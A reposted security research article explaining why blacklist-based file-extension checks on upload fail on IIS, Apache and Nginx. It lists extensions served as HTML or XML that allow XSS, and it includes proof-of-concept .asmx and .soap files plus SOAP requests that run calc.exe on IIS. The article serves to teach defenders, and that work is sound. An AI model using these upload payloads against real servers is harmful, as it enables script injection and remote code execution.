<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>WhiteList vs BlackList: how to implement file extension checks and not become a victim of hackers</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Often, during the analysis of the security of web applications, we are faced with uploading any files to the server - these may be photos of the accou...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>WhiteList vs BlackList: how to implement file extension checks and not become a victim of hackers</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/getpro/habr/post_images/bc9/55d/79c/bc955d79c1d96359f8e29f6cb1735610.png" alt="image"><br><br>  Often, during the analysis of the security of web applications, we are faced with uploading any files to the server - these may be photos of the account, some text documents, and anything else.  There are file extensions with which many have worked and know why they should be prohibited from uploading to the server (for example, when using the apache web server in conjunction with PHP, it is probably best to avoid downloading files with the .php extension from users).  However, it seemed to me that there were still some obscure formats that are perceived differently by different web servers. <br><br>  When writing code that is responsible for downloading files, web application developers can resort to checking the extension of the downloaded file either by WhiteList (and then you can download only files with a certain extension) or by BlackList (and then you can download any files that are not described in the list).  If you still use the second option, then this can often result in a vulnerability (for example, XSS or even RCE). 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      As a rule, programmers add already known and obvious extensions to BlackList.  The article will consider not the most common file types. <a name="habracut"></a><br><br>  The following payloads were used to demonstrate the PoC: <br><br><ul><li>  Basic XSS vector used for tests (Basic vector): <br><br><pre><code class="bash hljs">&lt;script&gt;alert(1337)&lt;/script&gt;</code> </pre> </li><li>  XSS-vector using XML (XML-based vector): <br><br><pre> <code class="bash hljs">&lt;a:script xmlns:a=<span class="hljs-string"><span class="hljs-string">"http://www.w3.org/1999/xhtml"</span></span>&gt;alert(1337)&lt;/a:script&gt;</code> </pre> </li></ul><br>  Next, I will show the results of this small study. <br><br><h2>  IIS </h2><br>  By default, IIS gives the files listed below with the content-type: text / html. <br><br><h4>  Extensions that allow using the Basic vector: </h4><br><ul><li>  .cer </li><li>  .hxt </li><li>  .htm </li></ul><br><img src="https://habrastorage.org/getpro/habr/post_images/332/c25/fbb/332c25fbbf8bc300334cd7242b2b97dc.jpg"><br><br>  Thus, it is possible to embed the XSS vector in the downloadable file.  When accessing the file, the browser successfully executes javascript. <br><br>  The next group of extensions IIS gives with the content-type, which allows you to perform XSS through the XML-vector. <br><br><h4>  Extensions that allow you to use an XML-based vector: </h4><br><ul><li>  .dtd </li><li>  .mno </li><li>  .vml </li><li>  .xsl </li><li>  .xht </li><li>  .svg </li><li>  .xml </li><li>  .xsd </li><li>  .xsf </li><li>  .svgz </li><li>  .xslt </li><li>  .wsdl </li><li>  .xhtml </li></ul><br><img src="https://habrastorage.org/getpro/habr/post_images/90b/ee8/f0f/90bee8f0fda882f20e5fc46a6c7a6306.png"><br><br>  IIS supports SSI by default, but the exec section is disabled for security reasons.  With standard configuration, we will not be able to achieve arbitrary command execution, but it will be possible to read local files.  The following are extensions that, when used, allow IIS to use SSI directives. <br><br><h4>  Extensions for operating SSI: </h4><br><ul><li>  .stm </li><li>  .shtm </li><li>  .shtml </li></ul><br><img src="https://habrastorage.org/getpro/habr/post_images/350/aff/5d0/350aff5d0759d5140b9a81fb796cb736.png"><br><br>  <i>More details about using SSI are <a href="https://twitter.com/ldionmarcil/status/922561177636311041">described</a> in the @ldionmarcil tweet.</i> <br><br><h4>  Addition: </h4><br>  There are also two interesting extensions (.asmx and .soap) that can lead to the execution of arbitrary code.  This was discovered in collaboration with my colleague - Yuri Aleinov (@YuryAleinov). <br><br><h4>  Asmx extension </h4><br>  1. If it is possible to download files with the extension ‚Äú.asmx‚Äù, then this may lead to the execution of arbitrary code.  For example, take a file with the following content and upload it to the server: <br><br><pre> <code class="bash hljs">&lt;%@ WebService Language=<span class="hljs-string"><span class="hljs-string">"C#"</span></span> Class=<span class="hljs-string"><span class="hljs-string">"MyClass"</span></span> %&gt; using System.Web.Services; using System; using System.Diagnostics; [WebService(Namespace=<span class="hljs-string"><span class="hljs-string">""</span></span>)] public class MyClass : WebService { [WebMethod] public string <span class="hljs-function"><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Pwn_Function</span></span></span></span>() { Process.Start(<span class="hljs-string"><span class="hljs-string">"calc.exe"</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">return</span></span> <span class="hljs-string"><span class="hljs-string">"PWNED"</span></span>; } }</code> </pre><br><img src="https://habrastorage.org/getpro/habr/post_images/c45/6b9/244/c456b9244a3f15a7be764fadd22039de.png"><br><br>  2. Next, send the following POST request to the file that was able to download: <br><br><pre> <code class="bash hljs">POST /1.asmx HTTP/1.1 Host: localhost:44300 Content-Type: application/soap+xml; charset=utf-8 Content-Length: 287 &lt;?xml version=<span class="hljs-string"><span class="hljs-string">"1.0"</span></span> encoding=<span class="hljs-string"><span class="hljs-string">"utf-8"</span></span>?&gt; &lt;soap12:Envelope xmlns:xsi=<span class="hljs-string"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span></span> xmlns:xsd=<span class="hljs-string"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span></span> xmlns:soap12=<span class="hljs-string"><span class="hljs-string">"http://www.w3.org/2003/05/soap-envelope"</span></span>&gt; &lt;soap12:Body&gt; &lt;Pwn_Function/&gt; &lt;/soap12:Body&gt; &lt;/soap12:Envelope&gt;</code> </pre> <br>  3. As a result, IIS will launch the ‚Äúcalc.exe‚Äù process. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/bc9/55d/79c/bc955d79c1d96359f8e29f6cb1735610.png"><br><br><h4>  Soap extension: </h4><br>  1. The contents of the file that is loaded with the extension ".soap": <br><br><pre> <code class="bash hljs">&lt;%@ WebService Language=<span class="hljs-string"><span class="hljs-string">"C#"</span></span> Class=<span class="hljs-string"><span class="hljs-string">"MyClass"</span></span> %&gt; using System.Web.Services; using System; public class MyClass : MarshalByRefObject { public <span class="hljs-function"><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">MyClass</span></span></span></span>() { System.Diagnostics.Process.Start(<span class="hljs-string"><span class="hljs-string">"calc.exe"</span></span>); } }</code> </pre> <br>  2. SOAP request: <br><br><pre> <code class="bash hljs">POST /1.soap HTTP/1.1 Host: localhost:4430 Content-Length: 283 Content-Type: text/xml; charset=utf-8 SOAPAction: <span class="hljs-string"><span class="hljs-string">"/"</span></span> &lt;?xml version=<span class="hljs-string"><span class="hljs-string">"1.0"</span></span> encoding=<span class="hljs-string"><span class="hljs-string">"utf-8"</span></span>?&gt; &lt;soap:Envelope xmlns:xsi=<span class="hljs-string"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span></span> xmlns:xsd=<span class="hljs-string"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span></span> xmlns:soap=<span class="hljs-string"><span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/"</span></span>&gt; &lt;soap:Body&gt; &lt;MyFunction /&gt; &lt;/soap:Body&gt; &lt;/soap:Envelope&gt;</code> </pre> <br><img src="https://habrastorage.org/getpro/habr/post_images/82d/8e0/c5c/82d8e0c5c8110fa07ae80665b8330c39.png"><br><br><h2>  Apache (httpd or Tomcat) </h2><br><h4>  Extensions that allow using the Basic vector: </h4><br><ul><li>  .shtml </li><li>  .html.de or .html.xxx (xxx - any characters) * </li></ul><br><h4>  Extensions where you can use an XML-based vector: </h4><br><ul><li>  .rdf </li><li>  .xht </li><li>  .xml </li><li>  .xsl </li><li>  .svg </li><li>  .xhtml </li><li>  .svgz </li></ul><br>  * - if in the file name after .html follows .xxx, where xxx are any characters, then Apache will give the file with Content-Type text / html.  If instead of xxx there is, for example, de, en, ru, etc., then the web server will add the Content-language header with the corresponding value to the response. <br><br><h4>  Addition: </h4><br>  A large number of files with different Apache and Tomcat extensions return a Content-type without a header, which allows for a XSS attack, since  the browser itself often decides how to handle this page.  This question is well described in <a href="http://pwndizzle.blogspot.ru/2015/07/xss-extensions-and-content-types.html">this article</a> .  So, files with the .xbl extension are processed by Firefox browser as xml (if there is no Content-Type header in the answer), therefore it is possible to exploit XSS using an XML-based vector in this browser. <br><br><h2>  Nginx </h2><br><h4>  Extensions that allow using the Basic vector: </h4><br><ul><li>  .htm </li></ul><br><h4>  Extensions where you can use an XML-based vector: </h4><br><ul><li>  .svg </li><li>  .xml </li><li>  .svgz </li></ul><br><h2>  Conclusion </h2><br>  After analyzing the interaction of web servers with various extensions, file formats were found whose loading may lead to exploitation of vulnerabilities.  So, due to downloading certain files, an attacker could exploit vulnerabilities such as XSS or even RCE. <br><br>  This study may serve as yet another confirmation that the use of blacklists may adversely affect the security of the web application being developed.  Therefore, it is better to create a white list that will check the extension of the downloaded file. <br><br>  <b>By</b> Mikhail Klyuchnikov, Positive Technologies </div><p>Source: <a href="https://habr.com/ru/post/350526/">https://habr.com/ru/post/350526/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../350512/index.html">Using the KOMPAS-3D API ‚Üí Lesson 7 ‚Üí Getting to know the settings</a></li>
<li><a href="../350514/index.html">Two-tier ERP and SAP Business One: how it works</a></li>
<li><a href="../350516/index.html">Using the KOMPAS-3D API ‚Üí Lesson 8 ‚Üí More complex methods of writing to the title block</a></li>
<li><a href="../350520/index.html">Google, Qualcomm and cloud gaming services. Integration success?</a></li>
<li><a href="../350524/index.html">Results of MentorHack: chat bot for selecting conversations from dialogues, services for building career paths and teams</a></li>
<li><a href="../350528/index.html">How we did the Olympiad in SQL (end)</a></li>
<li><a href="../350530/index.html">Tibero and Oracle compatibility issues. Part 1. Conditional PL / SQL Compilation</a></li>
<li><a href="../350536/index.html">Elegant Patterns of Modern JavaScript: RORO</a></li>
<li><a href="../350538/index.html">Introduction to Gjallarhorn.Bindable.WPF (F #) on the example of the test</a></li>
<li><a href="../350540/index.html">Detective story about RMCP + and OpenSSL, or how Wireshark helped defeat an incorrect argument in OpenIPMI</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>